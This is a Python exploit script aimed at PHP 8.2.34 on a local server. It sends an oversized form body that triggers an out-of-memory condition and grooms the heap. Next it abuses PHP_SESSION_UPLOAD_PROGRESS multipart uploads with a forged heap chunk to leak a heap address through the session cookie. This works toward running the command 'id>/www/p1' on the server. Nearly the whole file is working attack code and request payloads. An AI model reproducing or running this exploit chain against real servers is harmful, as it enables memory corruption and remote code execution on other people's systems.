#!/usr/bin/env python3
"""Test egctl's ghost-bucket OOM (oversized key) on 8.2.34, then the stage-1
leak. If the ghost-bucket OOM sets up a heap state where the leak works, 8.2.34
becomes reachable."""
import sys, os, time, struct, socket, re
sys.path.insert(0, r"C:\Users\likat\p2s52704")
import exploit

PORT = 18111

def build_ghost_bucket(mem_mb=128, baseline=400_000, body_limit_mb=128, max_vars=1000):
    mem = mem_mb * 1024 * 1024
    body_limit = body_limit_mb * 1024 * 1024
    available = mem - baseline
    usable_body = min(body_limit, available // 2)
    target_pad_wire = int(usable_body * 0.80)
    max_pad = max_vars - 32
    pad_value_size = 32767
    pad_wire_cost = 5 + pad_value_size
    n_pad_needed = max(1, target_pad_wire // pad_wire_cost)
    if n_pad_needed > max_pad:
        pad_value_size = max(1024, (target_pad_wire // max_pad) - 6)
        pad_wire_cost = 5 + pad_value_size
    n_pad = min(max(1, target_pad_wire // pad_wire_cost), max_pad)
    actual_pad_wire = n_pad * (pad_wire_cost + 1)
    remaining = usable_body - actual_pad_wire
    trigger_key_len = max(remaining - 30 * 14 - 20, 256)
    parts = [f"p{i:03d}={'A' * pad_value_size}" for i in range(n_pad)]
    parts += [f"a[k{i:04d}]=v" for i in range(30)]
    parts.append(f"a[{'T' * trigger_key_len}][z]=1")
    payload = "&".join(parts).encode("ascii")
    return payload, dict(n_pad=n_pad, pad_value_size=pad_value_size,
                         trigger_key_len=trigger_key_len, size=len(payload))

def send(url, body, ct, timeout=120):
    req = ("POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Type: " + ct +
           "\r\nContent-Length: " + str(len(body)).encode().decode() + "\r\n\r\n").encode()
    s = socket.create_connection(("127.0.0.1", url), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req + body)
        out = bytearray()
        while len(out) < 4 << 20:
            c = s.recv(65536)
            if not c: break
            out += c
    except OSError:
        pass
    s.close()
    return bytes(out)

def main():
    payload, info = build_ghost_bucket()
    print(f"ghost-bucket payload: {info}", flush=True)
    # send ghost-bucket OOM
    resp = send(PORT, payload, "application/x-www-form-urlencoded", timeout=120)
    first = resp.split(b"\r\n", 1)[0]
    oom = b"Allowed memory size" in resp or b"xhausted" in resp
    print(f"ghost-bucket OOM -> {first!r} oom={oom}", flush=True)
    time.sleep(0.3)
    # now try the stage-1 leak
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=60, verbose=False)
    ex = exploit.Exploit(t, "id>/www/p1", huge_mb=256, verbose=False, profile="bookworm")
    ex.rotate()
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(exploit.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": exploit.SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(ex.stage1_n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(exploit.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    raw = exploit.parse_cookie(resp)
    base = exploit.chunk_base_from_cookie(raw)
    print(f"leak after ghost-bucket OOM -> cookie={len(raw)}B chunk=0x{base:x}" if base
          else f"leak after ghost-bucket OOM -> cookie={len(raw)}B (no chunk)", flush=True)

if __name__ == "__main__":
    main()
